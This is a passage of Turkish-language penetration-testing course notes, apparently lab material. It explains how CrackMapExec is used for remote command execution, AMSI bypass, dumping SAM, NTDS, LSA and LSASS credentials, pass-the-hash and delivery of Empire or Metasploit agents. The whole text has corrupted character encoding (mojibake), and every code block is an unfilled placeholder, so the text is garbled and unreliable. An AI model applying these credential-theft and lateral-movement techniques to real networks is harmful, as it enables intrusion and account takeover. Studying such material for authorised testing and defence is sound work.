VarsayÄ±lan olarak, `LocalAccountTokenFilterPolicy` deÄŸeri 0 olarak ayarlanmÄ±ÅŸtÄ±r, yani yalnÄ±zca built-in administrator hesabÄ± (RID 500) administration gÃ¶revlerini gerÃ§ekleÅŸtirebilir. Local administrator grubunda olsak bile, yalnÄ±zca kullanÄ±cÄ±mÄ±zÄ±n RID'si `500` ise remote komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz. DeÄŸer 1 olarak ayarlanÄ±rsa tÃ¼m administrative hesaplarÄ± yÃ¶netim gÃ¶revlerini yÃ¼rÃ¼tebilir.

Administrator yapÄ±landÄ±rabileceÄŸi bir diÄŸer ayar da local administrator hesabÄ±nÄ±n (RID 500) remote yÃ¶netim gÃ¶revlerini yerine getirmesini engellemektir. Bu, `FilterAdministratorToken` registry deÄŸerini 1 olarak ayarlayarak yapÄ±labilir; bu, built-in administrator hesabÄ±nÄ±n (RID 500) remote administrative tasks (remote yÃ¶netim gÃ¶revleri) gerÃ§ekleÅŸtiremeyeceÄŸi anlamÄ±na gelir.


### Administrator Olarak Komut YÃ¼rÃ¼tme

KomutlarÄ± Ã§alÄ±ÅŸtÄ±rmak ve administrators grubuna kimlerin Ã¼ye olduÄŸunu gÃ¶rmek iÃ§in Administrator hesabÄ±nÄ± kullanalÄ±m. Windows komut satÄ±rÄ± komutlarÄ±nÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in `-x` seÃ§eneÄŸini ve ardÄ±ndan Ã§alÄ±ÅŸtÄ±rmak istediÄŸimiz komutu kullanmamÄ±z gerekir.


### Bir Komutu Administrator Olarak Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_149}}


### RID 500 Olmayan Hesap Olarak Komut YÃ¼rÃ¼tme

YukarÄ±daki komutta, `localadmin` local user `Administrators` grubundadÄ±r, ancak remote komutu Ã§alÄ±ÅŸtÄ±ramaz:

### Komutu localadmin olarak Ã§alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_150}}

Bu, UAC'nin etkin olduÄŸu anlamÄ±na gelir. EÄŸer durum bÃ¶yleyse, hesap administrator olsa bile (Pwn3d!) mesajÄ±nÄ± almayacaÄŸÄ±z. Bu ayarÄ± geri almak istiyorsak, `LocalAccountTokenFilterPolicy`'yi 1 olarak ayarlayabiliriz.


### LocalAccountTokenFilterPolicy'yi DeÄŸiÅŸtirme

{{CODE_BLOCK_151}}


{{CODE_BLOCK_152}}


### Domain HesabÄ± Olarak Komut YÃ¼rÃ¼tme

`LocalAccountTokenFilterPolicy` yalnÄ±zca local hesaplar iÃ§in geÃ§erlidir. Bir domain kullanÄ±cÄ±mÄ±z varsa ve `administrators` grubunun bir parÃ§asÄ±ysa, UAC ayarÄ±yla bile komutu Ã§alÄ±ÅŸtÄ±rabiliriz. Bu senaryoda, `INLANEFREIGHT\robert` hesabÄ± `administrators` `grubunun` bir Ã¼yesidir, yani UAC etkin olsa bile komutlarÄ± yÃ¼rÃ¼tebilir.


### Komutu Robert olarak Ã§alÄ±ÅŸtÄ±r

{{CODE_BLOCK_153}}


### SMB ile Komut YÃ¼rÃ¼tme

CME'nin dÃ¶rt (4) farklÄ± komut yÃ¼rÃ¼tme yÃ¶ntemi vardÄ±r:

| Komut   | AÃ§Ä±klama                                                                                                                             |
| ------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| wmiexec | WMI (Windows Management Instrumentation) kullanÄ±larak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`diskte dosya oluÅŸturulur`).                               |
| atexec  | Windows `gÃ¶rev zamanlayÄ±cÄ±sÄ±` ile bir gÃ¶rev planlayarak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`fileless`, ancak Windowsâ€™un en son sÃ¼rÃ¼mÃ¼nde Ã§alÄ±ÅŸmaz). |
| smbexec | Bir servis oluÅŸturup Ã§alÄ±ÅŸtÄ±rarak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`fileless`, ancak Windowsâ€™un en son sÃ¼rÃ¼mÃ¼nde Ã§alÄ±ÅŸmaz).                       |
| mmcexec | wmiexec yÃ¶ntemine benzer, ancak komutlar Microsoft YÃ¶netim Konsolu (MMC) aracÄ±lÄ±ÄŸÄ±yla yÃ¼rÃ¼tÃ¼lÃ¼r.                                     |

Not: Her yÃ¶ntem her bilgisayarda Ã§alÄ±ÅŸmayabilir.

VarsayÄ±lan olarak, CME biri baÅŸarÄ±sÄ±z olursa farklÄ± bir yÃ¼rÃ¼tme yÃ¶ntemine geÃ§ecektir. KomutlarÄ± aÅŸaÄŸÄ±daki sÄ±rayla yÃ¼rÃ¼tmeye Ã§alÄ±ÅŸÄ±r:

* 1. wmiexec 2. atexec 3. smbexec 4. mmcexec

CME'yi yalnÄ±zca bir yÃ¼rÃ¼tme yÃ¶ntemi kullanmaya zorlamak istiyorsak, Ã¶rneÄŸin `--exec-method` bayraÄŸÄ±nÄ± kullanarak hangisini kullanacaÄŸÄ±mÄ±zÄ± belirtebiliriz:


### SMBExec YÃ¶ntemi ile Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_154}}

Alternatif olarak, -X seÃ§eneÄŸini kullanarak PowerShell ile komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz:

### wmiexec aracÄ±lÄ±ÄŸÄ±yla PowerShell Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_155}}


PowerShell seÃ§eneÄŸi -X Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda, perde arkasÄ±nda `CrackMapExec` aÅŸaÄŸÄ±dakileri yapacaktÄ±r:

* AMSI bypass 
* Obfuscate the payload 
* Execute the payload

### Ã–zel AMSI Bypass Ã‡alÄ±ÅŸtÄ±rma

Bu teknikler `PowerShell` Ã§alÄ±ÅŸtÄ±rÄ±lÄ±rken algÄ±lanabilir. Ã–zel bir AMSI bypass payload'u kullanmak istiyorsak, `--amsi-bypass` seÃ§eneÄŸini ve ardÄ±ndan kullanmak istediÄŸimiz payload'un yolunu kullanabiliriz. Ã–rneÄŸin, [AMSI Bypass DeÄŸiÅŸtirilmiÅŸ Amsi ScanBuffer](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#modified-amsi-scanbuffer-patch) YamasÄ±nÄ± kullanalÄ±m. Bunu bir dosyaya kaydedeceÄŸiz ve bu AMSI Bypass'Ä± bir web sunucusundan belleÄŸe yÃ¼klemek iÃ§in bir PowerShell scripti oluÅŸturacaÄŸÄ±z. Ä°ÅŸte adÄ±mlar:

*  â€œModified Amsi ScanBuffer Patchâ€ iÃ§eren dosyayÄ± indirin


### â€œModified Amsi ScanBuffer Patchâ€ ile Bir Dosya OluÅŸturun

{{CODE_BLOCK_156}}


Payload'u olduÄŸu gibi Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸÄ±rsak, komut maksimum uzunluk olan 8191 karakteri aÅŸacaÄŸÄ± iÃ§in baÅŸarÄ±sÄ±z olacaktÄ±r

### Komut Maksimum UzunluÄŸu AÅŸÄ±yor

{{CODE_BLOCK_157}}

* Bu sorunu Ã§Ã¶zmek iÃ§in, `shantanukhande-amsi.ps1` dosyasÄ±nÄ± indiren ve Ã§alÄ±ÅŸtÄ±ran bir PowerShell scripti oluÅŸturalÄ±m. AyrÄ±ca scriptimizi barÄ±ndÄ±rmak iÃ§in bir Python web sunucusu oluÅŸturmamÄ±z gerekecek.

### PowerShell Komut DosyasÄ±nÄ± OluÅŸturma ve BarÄ±ndÄ±rma

{{CODE_BLOCK_158}}


Not: Sonuna noktalÄ± virgÃ¼l (;) eklediÄŸinizden emin olun.

BaÅŸka bir terminalden, yeni AMSI bypass payload'umuzu Ã§alÄ±ÅŸtÄ±ralÄ±m:

### PowerShell Ã–zel AMSI Bypass Kullanma

{{CODE_BLOCK_159}}


### WinRM Kullanarak Komut YÃ¼rÃ¼tme

WinRM protokolÃ¼ ile de komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz. VarsayÄ±lan olarak WinRM, HTTP TCP port `5985` ve HTTPS TCP port `5986`'yÄ± dinler. Bu protokolle ilgili Ã¶zel bir ÅŸey, bir kullanÄ±cÄ±nÄ±n komutlarÄ± yÃ¼rÃ¼tmek iÃ§in `administrator` olmasÄ±nÄ± gerektirmemesidir. `Administrators` grubunun Ã¼yesiysek, `Remote Management Users` grubunun Ã¼yesiysek veya oturum yapÄ±landÄ±rmasÄ±nda aÃ§Ä±k `PowerShell Remoting` izinlerimiz varsa WinRM protokolÃ¼nÃ¼ kullanabiliriz.

### Command Execution using WinRM

{{CODE_BLOCK_160}}


### WinRM aracÄ±lÄ±ÄŸÄ±yla PowerShell Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_161}}

### Other PowerShell Options

WinRM komut yÃ¼rÃ¼tme ile kullanabileceÄŸimiz Ã§eÅŸitli seÃ§enekler vardÄ±r. Bunlardan bazÄ±larÄ±nÄ± gÃ¶relim:

| SeÃ§enek           | AÃ§Ä±klama                                                |
| ----------------- | ------------------------------------------------------- |
| --port PORT       | WinRM baÄŸlantÄ±sÄ± iÃ§in Ã¶zel bir port seÃ§mek.             |
| --ssl             | SSL etkinleÅŸtirilmiÅŸ WinRM'ye baÄŸlanmak.                |
| --ignore-ssl-cert | SSL ile baÄŸlanÄ±rken sertifika doÄŸrulamasÄ±nÄ± yok saymak. |

Not: WinRM protokolÃ¼ farklÄ± yÃ¼rÃ¼tme yÃ¶ntemlerini desteklemez.

### SSH Command Execution

CrackMapExec kullanarak Linux veya Windows Ã¼zerinde komutlarÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in SSH protokolÃ¼nÃ¼ de kullanabiliriz.

### Command Execution with SSH

{{CODE_BLOCK_162}}

Bir SSH sunucusuyla etkileÅŸime girmenin bir baÅŸka yaygÄ±n yolu da `public` ve `private` keyleri kullanmaktÄ±r. CrackMapExec, `--key-file` seÃ§eneÄŸi ile `private key` kullanÄ±mÄ±nÄ± destekler. AnahtarÄ±n Ã§alÄ±ÅŸmasÄ± iÃ§in `OPENSSH` formatÄ±nda olmasÄ± gerekir.

### Private Key Kullanarak SSH ile Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_163}}

Not: Herhangi bir parola yapÄ±landÄ±rÄ±lmamÄ±ÅŸsa, `-p` seÃ§eneÄŸini boÅŸ `(â€œâ€)` olarak ayarlamalÄ±yÄ±z, aksi takdirde bir hata alÄ±rÄ±z

Bu bÃ¶lÃ¼mde, CrackMapExec kullanarak komutlarÄ± yÃ¼rÃ¼tmek iÃ§in Ã¼Ã§ farklÄ± protokol keÅŸfettik ve daha Ã¶nce komutlarÄ± yÃ¼rÃ¼tmek iÃ§in MSSQL'in nasÄ±l kullanÄ±lacaÄŸÄ±nÄ± tartÄ±ÅŸtÄ±k. YazÄ±m sÄ±rasÄ±nda, CrackMapExec komutlarÄ± yÃ¼rÃ¼tmek iÃ§in diÄŸer dÃ¶rt protokolÃ¼ desteklemektedir. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in kimlik bilgilerini ayÄ±klamak iÃ§in nasÄ±l kullanÄ±lacaÄŸÄ± tartÄ±ÅŸÄ±lacaktÄ±r.


### Gizli Bilgileri Bulma ve Kullanma

Parola Ã§Ä±karma sÃ¶z konusu olduÄŸunda, CrackMapExec oldukÃ§a gÃ¼Ã§lÃ¼dÃ¼r. On workstation ele geÃ§irdiÄŸimizi ve tÃ¼mÃ¼nden kimlik bilgilerini almak iÃ§in LSASS process'inin belleÄŸini dump istediÄŸimizi dÃ¼ÅŸÃ¼nelim; CrackMapExec bunu yapabilir.

Bu bÃ¶lÃ¼mde, CrackMapExec'in Windows kimlik bilgilerini dump iÃ§in sunduÄŸu yÃ¶ntemleri inceleyeceÄŸiz.


### SAM

SAM database, tÃ¼m local kullanÄ±cÄ±larÄ±n kimlik bilgilerini iÃ§erir ve birÃ§ok administrator local kimlik bilgilerini birden fazla makinede yeniden kullandÄ±ÄŸÄ± iÃ§in bunlarÄ± ele geÃ§irmek kritik Ã¶neme sahiptir. `SMB` ve `WinRM` protokolleriyle kullanÄ±labilen `--sam` seÃ§eneÄŸini kullanarak SAM database iÃ§eriÄŸini hÄ±zlÄ± bir ÅŸekilde alabiliriz.

### Dumping SAM

{{CODE_BLOCK_164}}


### NTDS Active Directory Database

Kimlik bilgilerinin alÄ±nabileceÄŸi bir baÅŸka yer de Active Directory veritabanÄ±dÄ±r. ntds.dit dosyasÄ±, kullanÄ±cÄ± objeleri, gruplar ve grup Ã¼yeliÄŸi hakkÄ±ndaki bilgiler de dahil olmak Ã¼zere Active Directory verilerini depolayan bir veritabanÄ±dÄ±r. Ã–zellikle, dosya aynÄ± zamanda domain'deki tÃ¼m kullanÄ±cÄ±lar iÃ§in parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap iÃ§in [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleÅŸtirilmiÅŸse aÃ§Ä±k metin parolalarÄ±nÄ± da saklar). Bir Domain Admin hesabÄ±na veya bir replikasyon/DCSync gerÃ§ekleÅŸtirme ayrÄ±calÄ±klarÄ±na sahip baÅŸka bir hesaba eriÅŸimimiz varsa, bir Domain Controller'dan hash'leri dÃ¶kebiliriz

Hash'leri dump etmek iÃ§in `--ntds` seÃ§eneÄŸini kullanmamÄ±z gerekir, aÅŸaÄŸÄ±daki Ã¶rnekte `robert` kullanÄ±cÄ±sÄ± bir Domain Admin deÄŸildir, ancak `replikasyon` gerÃ§ekleÅŸtirme ayrÄ±calÄ±klarÄ±na sahiptir.

### Domain Controller Ã¼zerinden NTDS database dump etme

{{CODE_BLOCK_165}}

`--ntds` seÃ§eneÄŸini kullanÄ±rken `--user` ve `--enabled` seÃ§eneklerini dahil edebiliriz. EÄŸer `--user` kullanÄ±rsak ayÄ±klamak istediÄŸimiz kullanÄ±cÄ±yÄ± belirtebiliriz. KRBTGT hesabÄ± iÃ§in hash dump alalÄ±m.

### YalnÄ±zca KRBTGT HesabÄ±nÄ±n Dump Edilmesi

{{CODE_BLOCK_166}}

EÄŸer `--enabled` olarak belirtirsek, sadece ekranda `etkin` olan kullanÄ±cÄ±larÄ± gÃ¶sterecek ve bize etkin kullanÄ±cÄ±larÄ±n listesini Ã§Ä±karma seÃ§eneÄŸi sunacaktÄ±r.


### YalnÄ±zca Enabled HesaplarÄ± GÃ¶sterme

{{CODE_BLOCK_167}}


### Secrets (hash'leri) kullanma

Elde ettiÄŸimiz ÅŸifreler NTLM hash'leridir. Hash'leri kÄ±rmayÄ± deneyebilir veya parolayÄ± kÄ±rmadan kullanÄ±cÄ± olarak kimlik doÄŸrulamasÄ± yapmak iÃ§in `Pass the Hash` tekniÄŸini kullanabiliriz. 

CrackMapExec, parola yerine kimlik doÄŸrulama yÃ¶ntemi olarak bir NTLM hash'i gerektiren `-H` seÃ§eneÄŸine sahiptir:

### Using NTLM Hashes

{{CODE_BLOCK_168}}

NTLM kimlik doÄŸrulamasÄ± SMB, WinRM , RDP, LDAP ve MSSQL protokolleri iÃ§in desteklenir


### LSA Secrets/Cached Credentials

CrackMapExec, remote makineden herhangi bir agent Ã§alÄ±ÅŸtÄ±rmadan hash dump iÅŸlemi gerÃ§ekleÅŸtiren `impacket-secretsdump`'tan alÄ±nmÄ±ÅŸ `--lsa` seÃ§eneÄŸiyle birlikte gelir. Bu seÃ§enek, Cached credentials, local machine key list, [Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) keys ve service credentials dahil olmak Ã¼zere LSA Secrets'Ä± dump eder.

`LSA Secrets`, Windows'ta Local Security Authority (LSA) tarafÄ±ndan kullanÄ±lan kritik veriler iÃ§in benzersiz bir korumalÄ± depolama alanÄ±dÄ±r. LSA, bir sistemin local security policy'sini yÃ¶netmek, denetlemek, kimlik doÄŸrulamak, kullanÄ±cÄ±larÄ±n sistemde oturumunu aÃ§mak, Ã¶zel verileri depolamak vb. iÃ§in tasarlanmÄ±ÅŸtÄ±r. KullanÄ±cÄ±larÄ±n ve sistemlerin hassas verileri gizli dosyalarda saklanÄ±r. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarlarÄ± verileri ÅŸifrelemek iÃ§in kullanÄ±lÄ±r


### LSA'yÄ± inceleyin
{{CODE_BLOCK_169}}


`DCC2$` ile baÅŸlayan hash formatÄ± `Domain Cached Credentials 2 (DCC2)`, MS Cache 2'dir. Bu hash'ler, zayÄ±f bir parola belirlenmiÅŸse `Hashcat` kullanÄ±larak kÄ±rÄ±labilir Ã§Ã¼nkÃ¼ bu algoritma `NTLM`'den Ã§ok daha gÃ¼Ã§lÃ¼dÃ¼r. AyrÄ±ca, Domain Cached Credential hash'leri `Pas the Hash` saldÄ±rÄ±sÄ± iÃ§in kullanÄ±lamaz. BunlarÄ± kÄ±rmak iÃ§in, domain ve kullanÄ±cÄ± adÄ±nÄ± kaldÄ±rmamÄ±z, `$DCC2$` 'den sonraki deÄŸeri almamÄ±z ve Hashcat modÃ¼l 2100'Ã¼ kullanmamÄ±z gerekir.


### Cracking Hashes

{{CODE_BLOCK_170}}


{{CODE_BLOCK_171}}


### LSASS'tan Secrets elde etme

LSASS prosesinin belleÄŸi, Windows parolalarÄ±nÄ± `aÃ§Ä±k metin` olarak veya `NTLM` veya `AES256/AES128` gibi diÄŸer hash biÃ§imlerini iÃ§erir. BelleÄŸi dump etmek, bir domain administrator bulana kadar daha fazla hesap bulmak iÃ§in etkili bir yol olabilir.

CrackMapExec, LSASS process belleÄŸinin iÃ§eriÄŸini dump etmek iÃ§in Ã§eÅŸitli modÃ¼ller iÃ§erir. Bunlardan bazÄ±larÄ±nÄ± gÃ¶relim:

* [Lsassy](https://github.com/login-securite/lsassy) Python aracÄ±, bir dizi host Ã¼zerindeki kimlik bilgilerini remote olarak ayÄ±klamak iÃ§in kullanÄ±lÄ±r. Bu [blog](https://en.hackndo.com/remote-lsass-dump-passwords/) yazÄ±sÄ± nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± aÃ§Ä±klamaktadÄ±r. Bu araÃ§, bir LSASS dump'Ä±ndaki gerekli baytlarÄ± remote okumak iÃ§in `Impacket` projesini ve kimlik bilgilerini Ã§Ä±karmak iÃ§in `pypykatz` kullanÄ±r.


### Lsassy Module

{{CODE_BLOCK_172}}

* Procdump, LSASS process dump oluÅŸturmak iÃ§in Sysinternals'tan Microsoft `Procdump`'Ä± ve kimlik bilgilerini Ã§Ä±karmak iÃ§in `pypykatz`'Ä± kullanÄ±r.


### Procdump Module

{{CODE_BLOCK_173}}


* **[HandleKatz](https://github.com/codewhitesec/HandleKatz)** aracÄ±, **LSASS**'e ait kopyalanmÄ±ÅŸ **handle**'larÄ±n kullanÄ±mÄ±nÄ± gÃ¶stererek, aynÄ± **process**'in **gizlenmiÅŸ** bir bellek dump'Ä±nÄ± oluÅŸturur.


### Handlekatz Module

{{CODE_BLOCK_174}}


* **[Nanodump](https://github.com/helpsystems/nanodump)**, **LSASS process**'inin **minidump**'Ä±nÄ± oluÅŸturan esnek bir araÃ§tÄ±r. **LSASS**'e bir **handle** aÃ§mak tespit edilebileceÄŸinden, **Nanodump** mevcut **handle**'larÄ± arayabilir. EÄŸer bir **handle** bulunursa, bunu kopyalayÄ±p **minidump** oluÅŸturmak iÃ§in kullanÄ±r. Ancak, bÃ¶yle bir **handle** bulunacaÄŸÄ±nÄ±n garantisi yoktur.

Not : **Handle**, bir **process**'in **dosya, bellek bÃ¶lgesi veya baÅŸka bir kaynak** ile etkileÅŸime geÃ§mesini saÄŸlayan **benzersiz bir tanÄ±mlayÄ±cÄ±dÄ±r**.

### Nanodump Module

{{CODE_BLOCK_175}}

Bu bÃ¶lÃ¼mde bir bilgisayardan veya domain'den kimlik bilgilerini almak iÃ§in farklÄ± yÃ¶ntemler gÃ¶sterilmektedir. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in bir C2 framework ile birlikte kullanÄ±mÄ± incelenecektir.

---


### Bir **C2 Framework** iÃ§inde **session**'larÄ± alma.

CrackMapExec ile ilginÃ§ olabilecek bir ÅŸey, birden fazla hedefi tehlikeye attÄ±ÄŸÄ±mÄ±zda, daha fazla recon yapmak veya `Empire` veya `Metasploit` gibi bir C2 Framework kullanarak Ã§alÄ±ÅŸmak isteyebiliriz. Her hedef makinede bir payload Ã§alÄ±ÅŸtÄ±rmak ve C2'mize bir `agent` almak iÃ§in CrackMapExec'i kullanabiliriz.

Bu bÃ¶lÃ¼mde CME'yi PowerShell Empire ve Metasploit framework ile entegre eden iki modÃ¼l ele alÄ±nacaktÄ±r. AyrÄ±ca farklÄ± bir C2 framework'Ã¼ kullanÄ±rsak bir alternatif de keÅŸfedeceÄŸiz.


### Empire

Web sitelerinde saÄŸlanan [kÄ±lavuzu](https://bc-security.gitbook.io/empire-wiki/quickstart/installation) kullanarak [Empire framework](https://github.com/BC-SECURITY/Empire)'Ã¼ yÃ¼kleyerek baÅŸlayacaÄŸÄ±z


### Empire Server'Ä± Kurun ve BaÅŸlatÄ±n

{{CODE_BLOCK_176}}

Daha sonra Empire'Ä± seÃ§tiÄŸimiz kullanÄ±cÄ± adÄ± ve ÅŸifre ile Ã§alÄ±ÅŸtÄ±rmamÄ±z gerekiyor. Biz `empireadmin` kullanÄ±cÄ± adÄ±nÄ± ve `asdasd123` ÅŸifresini kullanacaÄŸÄ±z! .


### Empire'Ä± Ã–zel KullanÄ±cÄ± AdÄ± ve Parola ile Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_177}}

ArdÄ±ndan, CrackMapExec yapÄ±landÄ±rma dosyasÄ±nÄ± ve Empire client yapÄ±landÄ±rma dosyasÄ±nÄ± seÃ§tiÄŸimiz kullanÄ±cÄ± adÄ± ve parolayla eÅŸleÅŸecek ÅŸekilde dÃ¼zenlememiz gerekir.

CrackMapExec yapÄ±landÄ±rma dosyasÄ± varsayÄ±lan olarak `~/.cme/cme.conf` adresinde bulunur. `[Empire]` seÃ§eneÄŸini `empireadmin` kullanÄ±cÄ± adÄ± ve `asdasd123` ÅŸifresiyle eÅŸleÅŸecek ÅŸekilde deÄŸiÅŸtirmemiz gerekiyor! . VarsayÄ±lan olarak, Empire local server `1337` portunda Ã§alÄ±ÅŸÄ±r. CrackMapExec yapÄ±landÄ±rma dosyasÄ±nda deÄŸiÅŸtirilebilir.


### CrackMapExec Configuration File

{{CODE_BLOCK_178}}


AynÄ± ÅŸeyi Empire yapÄ±landÄ±rma dosyasÄ± iÃ§in de yapmamÄ±z gerekiyor. Dosya `empire/client/config.yaml` adresinde bulunur:


### Ä°nceleme

{{CODE_BLOCK_179}}


YapÄ±landÄ±rma dosyalarÄ± deÄŸiÅŸtirildikten sonra, Empire client ile Empire sunucusuna baÄŸlanmalÄ±yÄ±z

{{CODE_BLOCK_180}}

Åimdi listener'Ä± ayarlamamÄ±z gerekiyor ve host'u IP adresimize ve Port'u da aracÄ±nÄ±n baÄŸlanacaÄŸÄ± TCP 8001'e ayarlayacaÄŸÄ±z.

### Empire Client Connection

{{CODE_BLOCK_181}}


### Empire Setting up IP and Port

{{CODE_BLOCK_182}}

ArtÄ±k listener'Ä±mÄ±z Ã§alÄ±ÅŸÄ±yor ve `empire_exec` modÃ¼lÃ¼ ile Empire'a bir `agent` almak iÃ§in CrackMapExec'i kullanabiliriz. AyarladÄ±ÄŸÄ±mÄ±z listener olan `LISTENER=http` seÃ§eneÄŸini eklememiz gerekiyor.


### CrackMapExec ModÃ¼lÃ¼nÃ¼ Kullanma empire_exec

{{CODE_BLOCK_183}}


Bunu Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda, PowerShell Empire'da yeni bir agent gÃ¶rmeliyiz.

![Pasted image 20241203121035.png](/img/user/resimler/Pasted%20image%2020241203121035.png)


### Metasploit

AynÄ± ÅŸeyi CrackMapExec modÃ¼lÃ¼ `web_delivery` kullanarak Metasploit Framework Ã¼zerinde de yapabiliriz. Metasploit Framework'te `web_delivery` modÃ¼lÃ¼nÃ¼ yapÄ±landÄ±rmamÄ±z ve saÄŸlanan URL'yi CrackMapExec modÃ¼lÃ¼mÃ¼ze bir parametre olarak kullanmamÄ±z gerekir. Msfconsole'u baÅŸlatalÄ±m ve `web_delivery` handler'Ä±nÄ± yapÄ±landÄ±ralÄ±m


### Metasploit Configure web_delivery Handler

{{CODE_BLOCK_184}}

Metasploit'te web delivery handler yapÄ±landÄ±rÄ±ldÄ±ktan sonra web_delivery modÃ¼lÃ¼nÃ¼ kullanabiliriz. `URL` ve `PAYLOAD` olmak Ã¼zere iki seÃ§eneÄŸi destekler. URL seÃ§eneÄŸini Metasploit tarafÄ±ndan saÄŸlanan URL ile ayarlamamÄ±z gerekir ve PAYLOAD seÃ§eneÄŸi seÃ§tiÄŸimiz payload mimarisine karÅŸÄ±lÄ±k gelir. EÄŸer `x64` kullanÄ±yorsak, `x64` varsayÄ±lan deÄŸer olduÄŸu iÃ§in bu seÃ§eneÄŸi atlayabiliriz ya da `PAYLOAD=64` kullanabiliriz. EÄŸer `32 bit` payload kullanÄ±yorsak `PAYLOAD=32` seÃ§eneÄŸini ayarlamamÄ±z gerekir. Åimdi bunu Ã§alÄ±ÅŸÄ±rken gÃ¶relim:


### CrackMapExec web_delivery Module

{{CODE_BLOCK_185}}

{{CODE_BLOCK_186}}

Metasploit'te yeni bir oturum gÃ¶rmeliyiz:

![Pasted image 20241203121353.png](/img/user/resimler/Pasted%20image%2020241203121353.png)


### Other C2 Frameworks

BaÅŸka bir C2 Framework kullanmak istediÄŸimizde, **Command Execution** bÃ¶lÃ¼mÃ¼nde bahsedilen (SMB, WinRM, SSH) yÃ¶ntemleri kullanarak aynÄ± sonucu elde edebiliriz. Ã–rneÄŸin, bir **PowerShell** payload'u oluÅŸturabilir, bu payload'u bir web sunucusuna kaydedebilir ve payload'u indirip Ã§alÄ±ÅŸtÄ±rmak iÃ§in **-X** seÃ§eneÄŸiyle bir PowerShell komutu Ã§alÄ±ÅŸtÄ±rabiliriz. AyrÄ±ca, iÅŸlemi arka planda yÃ¼rÃ¼tmek iÃ§in **`--no-output`** seÃ§eneÄŸini seÃ§memiz gerekecektir.

Ã–rnek olarak Metasploit'i kullanalÄ±m ve modÃ¼lÃ¼ kullanmak yerine web_delivery payload'unda saÄŸlanan PowerShell script'ini kopyalamayÄ± deneyelim:

![Pasted image 20241203122258.png](/img/user/resimler/Pasted%20image%2020241203122258.png)

Bu bÃ¶lÃ¼m, CrackMapExec'i C2 Frameworks gibi diÄŸer bilgisayar korsanlÄ±ÄŸÄ± araÃ§larÄ±yla nasÄ±l kullanabileceÄŸimizi araÅŸtÄ±rÄ±yor. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in BloodHound ile nasÄ±l entegre edileceÄŸi incelenecektir.


---

### Bloodhound Entegrasyonu

BloodHound, hem saldÄ±rganlar hem de savunmacÄ±lar tarafÄ±ndan alan gÃ¼venliÄŸini analiz etmek iÃ§in kullanÄ±lan aÃ§Ä±k kaynaklÄ± bir araÃ§tÄ±r. AraÃ§, domain'den toplanan bÃ¼yÃ¼k miktarda veriyi alÄ±r. Ä°liÅŸkiyi gÃ¶rsel olarak temsil etmek ve geleneksel numaralandÄ±rma ile tespit edilmesi zor veya imkansÄ±z olan domain saldÄ±rÄ± yollarÄ±nÄ± belirlemek iÃ§in grafik teorisini kullanÄ±r. Bu bÃ¶lÃ¼mde Bloodhound'a aÅŸina olduÄŸunuzu varsayÄ±yoruz. 


### **BloodHound**'da **Owned** olarak iÅŸaretleme.

BloodHound'da bir Node'u (user, grup, computer vb.) manuel olarak ele geÃ§irilmiÅŸ (owned) olarak iÅŸaretleyebiliriz. Bunu yapmak iÃ§in node'a saÄŸ tÄ±klayÄ±p **`Mark X as Owned`** seÃ§eneÄŸine tÄ±klamamÄ±z yeterlidir. Bu, ele geÃ§irdiÄŸimiz kullanÄ±cÄ±larÄ± ve bilgisayarlarÄ± takip etmek aÃ§Ä±sÄ±ndan faydalÄ±dÄ±r, Ã¶zellikle bÃ¼yÃ¼k bir organizasyonla Ã§alÄ±ÅŸÄ±rken. AyrÄ±ca, **`Shortest Path from Owned Principals`** (Ele GeÃ§irilmiÅŸ Principal'dan En KÄ±sa Yol) veya **`Shortest Paths to Domain Admins from Owned Principals`** (Ele GeÃ§irilmiÅŸ Principal'dan Domain Adminlerine En KÄ±sa Yollar) gibi bir BloodHound cypher sorgusu gerÃ§ekleÅŸtirmek istediÄŸimizde de kullanÄ±ÅŸlÄ±dÄ±r.

CrackMapExec'i, ele geÃ§irdiÄŸimiz herhangi bir user veya computer'Ä± BloodHound veritabanÄ±nda `owned` olarak iÅŸaretleyecek ÅŸekilde yapÄ±landÄ±rabiliriz. Bunu yapmak iÃ§in, `~/.cme/cme.conf` adresinde bulunan CrackMapExec yapÄ±landÄ±rma dosyasÄ±nÄ± aÅŸaÄŸÄ±daki seÃ§eneklerle deÄŸiÅŸtirmemiz gerekir:

* Bloodhound yapÄ±landÄ±rma seÃ§eneÄŸi `bh_enabled`'Ä± `True` olarak ayarlayÄ±n.
* `bh_uri`'yi Bloodhound veritabanÄ± `IP` adresimize ayarlayÄ±n.
* `bh_port`'u veritabanÄ± `portuna` ayarlayÄ±n
* Kimlik bilgilerini bloodhound veritabanÄ±yla eÅŸleÅŸecek ÅŸekilde ayarlayÄ±n: kullanÄ±cÄ± adÄ± `neo4j` ve ÅŸifre `asdasd123` (VeritabanÄ±nÄ±za karÅŸÄ±lÄ±k geleni kullandÄ±ÄŸÄ±nÄ±zdan emin olun).

YapÄ±landÄ±rma aÅŸaÄŸÄ±daki gibi gÃ¶rÃ¼nmelidir:


